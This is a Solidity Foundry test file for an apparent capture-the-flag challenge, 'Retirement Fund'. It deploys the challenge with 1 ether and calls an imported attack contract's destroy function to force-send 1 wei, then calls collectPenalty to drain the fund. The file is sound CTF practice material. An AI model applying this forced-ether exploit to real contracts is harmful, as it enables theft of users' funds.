// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test } from "forge-std/Test.sol";
import { RetirementFundChallengeFactory } from "../src/challenges/12_RetirementFund/RetirementFundChallengeFactory.sol";
import { RetirementFundAttack } from "../src/attacks/RetirementFundAttack.sol";

interface IRetirementFundChallenge {
    function isComplete() external returns (bool);

    function collectPenalty() external;
}

contract RetirementFundTest is Test {
    IRetirementFundChallenge challenge;

    function setUp() public {
        RetirementFundChallengeFactory factory = new RetirementFundChallengeFactory();
        address challengeAddress = factory.createChallenge{ value: 1 ether }(address(this));
        challenge = IRetirementFundChallenge(challengeAddress);
    }

    function test() public {
        RetirementFundAttack attacker = new RetirementFundAttack();
        attacker.destroy{ value: 1 }(payable(address(challenge)));
        challenge.collectPenalty();

        assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}